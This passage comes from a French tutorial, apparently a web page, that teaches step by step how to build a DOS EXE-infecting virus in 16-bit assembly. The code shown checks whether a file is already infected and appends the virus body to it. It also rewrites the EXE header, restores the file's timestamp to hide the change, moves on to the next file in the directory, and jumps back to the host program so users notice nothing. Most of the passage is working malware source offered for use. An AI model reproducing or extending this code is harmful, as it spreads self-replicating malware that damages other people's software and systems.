&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">; compare le premier champs avec 'ZM' pour voir si &nbsp;</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">jne</span> &nbsp; &nbsp; close &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">; on est dans le bon fichier. Sinon on se casse. </span><br/>
<br/>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">cmp</span> &nbsp; &nbsp; <span style="color: #0000ff; font-weight: bold;">word</span> ptr <span style="color: black;">&#91;</span><span style="color: #46aa03; font-weight: bold;">bp</span><span style="color: #339933;">+</span>buffer_header <span style="color: #339933;">+</span> <span style="color: #ff0000;">12</span><span style="color: black;">&#93;</span><span style="color: #339933;">,</span> <span style="color: #7f007f;">'T'</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">; vérifie si le fichier est déjà infecté</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">je</span>&nbsp; &nbsp; &nbsp; close &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">; sinon on se barre </span><br/>
&nbsp;</div>
<p>Voilà, maintenant, on va pouvoir commencé l'infection du fichier. En premier, il va falloir sauvegarder les principaux champs de l'en-tête pour pouvoir les manipuler par la suite, on fera ceci avec le call save_header. En deuxième, on va modifier les offsets 0eh, 10h, 12h, 14h et 16h. Et en dernier, on va recalculer la taille du fichier. Ces 3 étapes étant selon les plus difficiles à comprendre, je les expliquerai plus tard.</p>
<p>Entre cela, vous remarquerez que l'on a dépalcé le pointeur de fichier à la fin de celui ci.</p>
<div class="asm" style="font-family:monospace;color: #000066;  border: solid thin #c2c1b1; background: #d6d5c5;">&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">call</span>&nbsp; &nbsp; save_header &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">; on sauvegarde l'header d'origine</span><br/>
<br/>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">mov</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">ah</span><span style="color: #339933;">,</span> <span style="color: #ff0000;">42h</span> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">; fonction 42h -&gt; déplace le pointeur de fichier</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">mov</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">al</span><span style="color: #339933;">,</span> <span style="color: #ff0000;">02h</span> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">; al = 02h -&gt; on le déplace à la fin </span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">xor</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">cx</span><span style="color: #339933;">,</span> <span style="color: #46aa03; font-weight: bold;">cx</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">xor</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">dx</span><span style="color: #339933;">,</span> <span style="color: #46aa03; font-weight: bold;">dx</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">int</span> &nbsp; &nbsp; <span style="color: #ff0000;">21h</span><br/>
<br/>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">call</span>&nbsp; &nbsp; new_csip&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">; on change certains champs de l'header</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">call</span>&nbsp; &nbsp; new_size&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">; et on calcule la nouvelle taille après infection</span><br/>
&nbsp;</div>
<p>Donc, après avoir fait tout ceci, et ayant calculer les nouveaux champs de l'header, nous allons devoir bien entendu écrire le virus. Notez que l'on écrira celui ci à la fin du fichier et cela en premier. Et en deuxième, on va réecrire la nouvelle en-têtes que l'on viendra de calculer. Voici le descriptif des fonctions utilisés:</p>
<pre class="source">
Fonction 40h
Cette fonction écrit un nombre de caractères dans le fichier que l'on aura
spécifier à l'endroit où sera placé le pointeur du fichier.

ah -> 40h
bx -> handle du fichier
cx -> nombre d'octets à écrire dans le fichier
dx -> à partir de quel adresse on écrit.
</pre>
<div class="asm" style="font-family:monospace;color: #000066;  border: solid thin #c2c1b1; background: #d6d5c5;">&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">mov</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">ah</span><span style="color: #339933;">,</span> <span style="color: #ff0000;">40h</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">pop</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">bx</span>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">; handle du fichier</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">mov</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">cx</span><span style="color: #339933;">,</span> fin <span style="color: #339933;">-</span> debut &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">; taille du fichier</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">lea</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">dx</span><span style="color: #339933;">,</span> <span style="color: black;">&#91;</span><span style="color: #46aa03; font-weight: bold;">bp</span> <span style="color: #339933;">+</span> debut<span style="color: black;">&#93;</span>&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">; on écrit à partir de debut</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">int</span> &nbsp; &nbsp; <span style="color: #ff0000;">21h</span><br/>
<br/>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">mov</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">ah</span><span style="color: #339933;">,</span> <span style="color: #ff0000;">42h</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">mov</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">al</span><span style="color: #339933;">,</span> <span style="color: #ff0000;">00h</span> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">; on se place au début du fichier pour écrire la &nbsp; </span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">xor</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">cx</span><span style="color: #339933;">,</span> <span style="color: #46aa03; font-weight: bold;">cx</span>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">; nouvelle header</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">xor</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">dx</span><span style="color: #339933;">,</span> <span style="color: #46aa03; font-weight: bold;">dx</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">int</span> &nbsp; &nbsp; <span style="color: #ff0000;">21h</span><br/>
<br/>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">mov</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">ah</span><span style="color: #339933;">,</span> <span style="color: #ff0000;">40h</span> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">; on écrit </span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">mov</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">cx</span><span style="color: #339933;">,</span> <span style="color: #ff0000;">1ah</span> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">; les 1ah octets de l'entete que l'on vient de calculer</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">lea</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">dx</span><span style="color: #339933;">,</span> <span style="color: black;">&#91;</span><span style="color: #46aa03; font-weight: bold;">bp</span> <span style="color: #339933;">+</span> buffer_header<span style="color: black;">&#93;</span><span style="color: black; font-style: italic;">; et qui stocké à partir de l'adresse de buffer_header</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">int</span> &nbsp; &nbsp; <span style="color: #ff0000;">21h</span><br/>
<br/>
close<span style="color: #339933;">:</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">pop</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">bx</span>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">; on pop le bx pushé avant</span><br/>
<br/>
close2<span style="color: #339933;">:</span><br/>
<br/>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">pop</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">dx</span>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">; on pop la date et l'heure de la dernière modification</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">pop</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">cx</span>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">; du fichier que l'on avait sauvegardé au début </span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">mov</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">ax</span><span style="color: #339933;">,</span> <span style="color: #ff0000;">5701h</span> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">; et on définit la date</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">int</span> &nbsp; &nbsp; <span style="color: #ff0000;">21h</span><br/>
<br/>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">mov</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">ah</span><span style="color: #339933;">,</span> <span style="color: #ff0000;">3eh</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">int</span> &nbsp; &nbsp; <span style="color: #ff0000;">21h</span> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">; on ferme le fichier qui est désormais infecté &nbsp;</span><br/>
<br/>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">mov</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">ah</span><span style="color: #339933;">,</span> <span style="color: #ff0000;">4fh</span> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">; et on lit la prochaine entrée du répertoire</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">jmp</span> &nbsp; &nbsp; search&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">; on recommence la nouvelle recherche</span><br/>
&nbsp;</div>
<p>Voilà, après toutes ces étapes nous avons tous les fichiers de notre répertoire qui sont désormais infecté. Mais pour rester le plus discret possible au yeux de l'utilisateur, le virus doit redonner la main au fichier hôte comme si rien ne s'était passé. Pour cela, il va falloir effectué un saut à la première instruction du fichier hôte, ainsi ce fichier pourra après avoir exécuté le code du virus exécuté le sien, et tout fonctionnera comme si aucun fichier n'vait été infecté. Et ce passage est assez difficile à comprendre, c'est pour ça que j'essairai de bien le détailler.</p>
<p>Tout d'abord, nous avons que tout à l'heure nous avons modifié l'adresse la dta, or normalement l'adresse de la table dta est déjà initilialisé, c'est pour cela que nous allons la restaurer, ainsi l'adresse de la dta ne sera pas modifié. Voici les quelques lignes de code:</p>
<div class="asm" style="font-family:monospace;color: #000066;  border: solid thin #c2c1b1; background: #d6d5c5;">end<span style="color: #339933;">:</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">pop</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">ds</span>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">; on pop ce que l'on avait pushé au tout début du programme</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">mov</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">dx</span><span style="color: #339933;">,</span><span style="color: #ff0000;">80</span> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">; nouvelle adresse d'offset de la table dta</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">mov</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">ah</span><span style="color: #339933;">,</span>1a &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">; et on définit la nouvelle adresse</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">int</span> &nbsp; &nbsp; <span style="color: #ff0000;">21</span><br/>
&nbsp;</div>
<p>Bon, maintenant attaquons une chose assez difficile à comprendre. Je parle bien sûr du moment où nous allons rendre la main au programme hôte. Cette étape est extrêmement importante, sans cela tous les programmes infectés planterait; le virus ne serait donc pas très discret. Ce qui faut comprendre, ce que avec cette procédure, nous allons créer un jmp qui va pointait sur la première instruction du programme hôte avant infection.</p>
<p>Mais avant tout cela, je vais d'abord un peu expliqué comment est organisé la mémoire pour les fichiers exe 16 bits. Il faut savoir que lorsque un fichier exe est chargé en mémoire, il est ajouté à sa base un petite structure que l'on appelle Psp (program segment prefix), et que cette structure a une taille de 256 octets, on en déduit donc que le Psp va se trouver dans la mémoire à cs-10h (car 10h*10h=256) si on admet que cs pointe au début de notre code. De plus les segments ds et es pointent tout deux sur Psp.</p>
<p>Voici un shéma qui devrait un peu mieux vous expliqué:</p>
<pre class="source">
                              Structure d'un fichier en mémoire

                                    +----------------+            
                                    |      Stack     |
                                    |                |
                                    +----------------+
                                    |     Données    |
                                    |                |
                                    +----------------+
                                    |      Code      |
                                    |                |
                                    +----------------+  ->  cs:0000
                                    |       PSP      |
                                    |                |
                                    +----------------+  ->  cs-10h:0000
</pre>
<p>Regardond le code de cette partie:</p>
<div class="asm" style="font-family:monospace;color: #000066;  border: solid thin #c2c1b1; background: #d6d5c5;">&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">push</span>&nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">ds</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">pop</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">es</span>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">; ds = es</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">mov</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">ax</span><span style="color: #339933;">,</span><span style="color: #46aa03; font-weight: bold;">es</span> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">; ax = es = ds , ax pointe sur le psp</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">add</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">ax</span><span style="color: #339933;">,</span><span style="color: #ff0000;">10</span> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">; ax = ax + 10 , maintenant ax pointe sur cs</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">add</span> &nbsp; &nbsp; <span style="color: #0000ff; font-weight: bold;">word</span> ptr <span style="color: #46aa03; font-weight: bold;">cs</span><span style="color: #339933;">:</span><span style="color: black;">&#91;</span>cs_new<span style="color: #339933;">+</span><span style="color: #46aa03; font-weight: bold;">bp</span><span style="color: black;">&#93;</span><span style="color: #339933;">,</span><span style="color: #46aa03; font-weight: bold;">ax</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">; on ajoute le décalage relatif à partir de l'header</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <br/>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">cli</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">add</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">ax</span><span style="color: #339933;">,</span><span style="color: #0000ff; font-weight: bold;">word</span> ptr <span style="color: #46aa03; font-weight: bold;">cs</span><span style="color: #339933;">:</span><span style="color: black;">&#91;</span><span style="color: #46aa03; font-weight: bold;">bp</span><span style="color: #339933;">+</span>ss_new<span style="color: black;">&#93;</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">mov</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">ss</span><span style="color: #339933;">,</span><span style="color: #46aa03; font-weight: bold;">ax</span> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">; on ajoute es + 10 à ss</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">mov</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">sp</span><span style="color: #339933;">,</span><span style="color: #0000ff; font-weight: bold;">word</span> ptr <span style="color: #46aa03; font-weight: bold;">cs</span><span style="color: #339933;">:</span><span style="color: black;">&#91;</span><span style="color: #46aa03; font-weight: bold;">bp</span><span style="color: #339933;">+</span>sp_new<span style="color: black;">&#93;</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">sti</span><br/>
<br/>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #0000ff; font-weight: bold;">db</span>&nbsp; &nbsp; &nbsp; 0ea &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">; jmp far vers le début du prog</span><br/>
ip_new&nbsp; <span style="color: #0000ff; font-weight: bold;">dw</span>&nbsp; &nbsp; &nbsp; <span style="color: #ff0000;">0</span> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">; ce qui donne jmp cs:ip avec cs:ip qui pointent </span><br/>
cs_new&nbsp; <span style="color: #0000ff; font-weight: bold;">dw</span>&nbsp; &nbsp; &nbsp; <span style="color: #ff0000;">0</span> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">; sur notre code</span><br/>
sp_new&nbsp; <span style="color: #0000ff; font-weight: bold;">dw</span>&nbsp; &nbsp; &nbsp; <span style="color: #ff0000;">0</span><br/>
ss_new&nbsp; <span style="color: #0000ff; font-weight: bold;">dw</span>&nbsp; &nbsp; &nbsp; <span style="color: #ff0000;">0</span><br/>
<br/>
ip_old&nbsp; <span style="color: #0000ff; font-weight: bold;">dw</span>&nbsp; &nbsp; &nbsp; <span style="color: #ff0000;">0</span><br/>
cs_old&nbsp; <span style="color: #0000ff; font-weight: bold;">dw</span>&nbsp; &nbsp; &nbsp; 0fff0 &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <br/>
sp_old&nbsp; <span style="color: #0000ff; font-weight: bold;">dw</span>&nbsp; &nbsp; &nbsp; <span style="color: #ff0000;">0</span> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<br/>
ss_old&nbsp; <span style="color: #0000ff; font-weight: bold;">dw</span>&nbsp; &nbsp; &nbsp; 0fff0 &nbsp; &nbsp; &nbsp; &nbsp; <br/>
&nbsp;</div>
<p>Petite explication, nous savons que es pointe sur le psp, donc es+10 pointe sur cs; or nous savons que cs_new représente le décalage relatif de la fin de l"header par rapport à l'entry point donc pour avoir la vrai adresse du programme en mémoire, il nous faut ajouter l'adresse du code du programme en mémoire. De cette façon, nous pouvons désormais effectuer un saut vers le Entry point de notre programme avant infection. Si vous ne comprenez pas tout ce que je dit, je vous conseille de tracer le code de l'infecteur pas à pas avec softice et d'analyser l'évoltion des différents registres, ca vous aidera beaucoup. Voilà, on a donc bien rendu la main au programme hôte.</p>
<p>Regardons désormais, les différentes fonctions que je n'ai pas encore expliqué et qui sont très importantes car elles permettent chacune de pouvoir modifier convenablement l'header du fichier pour que le fichier qui sera infecté ne soit pas corrompus et puisse fonctionne comme avant. Tout d'abord nous allons voir le call save_header qui ne fait rien de bien compliqué, en effet il se contente de sauvegarder les principaux champs de l'header qui sont les champs 0eh, 10h, 14h et 16h chacun contenant respectivement l'offset initial de Ss depuis la fin de l'header, l'offset initial de Sp depuis Ss, l' Ip initial et enfin le Cs initial. Le champs 14h et 16h permettent donc de connaitre la première instruction qui sera exécuté lorsque l'on lancera l'executable.</p>
<div class="asm" style="font-family:monospace;color: #000066;  border: solid thin #c2c1b1; background: #d6d5c5;">save_header<span style="color: #339933;">:</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">mov</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">ax</span><span style="color: #339933;">,</span><span style="color: #0000ff; font-weight: bold;">word</span> ptr <span style="color: black;">&#91;</span><span style="color: #46aa03; font-weight: bold;">bp</span><span style="color: #339933;">+</span>buffer_header<span style="color: #339933;">+</span><span style="color: #ff0000;">0Eh</span><span style="color: black;">&#93;</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">; sauvegarde ce qui se trouve à l'offset 0eh de </span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">mov</span> &nbsp; &nbsp; <span style="color: #0000ff; font-weight: bold;">word</span> ptr <span style="color: black;">&#91;</span><span style="color: #46aa03; font-weight: bold;">bp</span><span style="color: #339933;">+</span>ss_old<span style="color: black;">&#93;</span><span style="color: #339933;">,</span><span style="color: #46aa03; font-weight: bold;">ax</span> <span style="color: black; font-style: italic;">; de l'header dans ss_old.</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">mov</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">ax</span><span style="color: #339933;">,</span><span style="color: #0000ff; font-weight: bold;">word</span> ptr <span style="color: black;">&#91;</span><span style="color: #46aa03; font-weight: bold;">bp</span><span style="color: #339933;">+</span>buffer_header<span style="color: #339933;">+</span><span style="color: #ff0000;">10</span><span style="color: black;">&#93;</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">; sauvegarde ce qui se trouve à l'offset 10h de </span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">mov</span> &nbsp; &nbsp; <span style="color: #0000ff; font-weight: bold;">word</span> ptr <span style="color: black;">&#91;</span><span style="color: #46aa03; font-weight: bold;">bp</span><span style="color: #339933;">+</span>sp_old<span style="color: black;">&#93;</span><span style="color: #339933;">,</span><span style="color: #46aa03; font-weight: bold;">ax</span> <span style="color: black; font-style: italic;">; de l'header dans sp_old.</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">mov</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">ax</span><span style="color: #339933;">,</span><span style="color: #0000ff; font-weight: bold;">word</span> ptr <span style="color: black;">&#91;</span><span style="color: #46aa03; font-weight: bold;">bp</span><span style="color: #339933;">+</span>buffer_header<span style="color: #339933;">+</span><span style="color: #ff0000;">14</span><span style="color: black;">&#93;</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">; sauvegarde ce qui se trouve à l'offset 14h de </span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">mov</span> &nbsp; &nbsp; <span style="color: #0000ff; font-weight: bold;">word</span> ptr <span style="color: black;">&#91;</span><span style="color: #46aa03; font-weight: bold;">bp</span><span style="color: #339933;">+</span>ip_old<span style="color: black;">&#93;</span><span style="color: #339933;">,</span><span style="color: #46aa03; font-weight: bold;">ax</span> <span style="color: black; font-style: italic;">; de l'header dans ip_old.</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">mov</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">ax</span><span style="color: #339933;">,</span><span style="color: #0000ff; font-weight: bold;">word</span> ptr <span style="color: black;">&#91;</span><span style="color: #46aa03; font-weight: bold;">bp</span><span style="color: #339933;">+</span>buffer_header<span style="color: #339933;">+</span><span style="color: #ff0000;">16</span><span style="color: black;">&#93;</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">; sauvegarde ce qui se trouve à l'offset 16h de </span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">mov</span> &nbsp; &nbsp; <span style="color: #0000ff; font-weight: bold;">word</span> ptr <span style="color: black;">&#91;</span><span style="color: #46aa03; font-weight: bold;">bp</span><span style="color: #339933;">+</span>cs_old<span style="color: black;">&#93;</span><span style="color: #339933;">,</span><span style="color: #46aa03; font-weight: bold;">ax</span> <span style="color: black; font-style: italic;">; de l'header dans cs_old.</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">ret</span><br/>
&nbsp;</div>
<p>Il n'y a donc rien de compliqué de coté là, en revanche maintenant, nous allons attaquer une partie moins facile. Ici, on va modifier les champs de l'entête qui doivent être modifié pour que le fichier fonctionne. Dans ce call, nous allons modifié 5 champs, je vais commencé par vous expliquer les moins compliqué.</p>
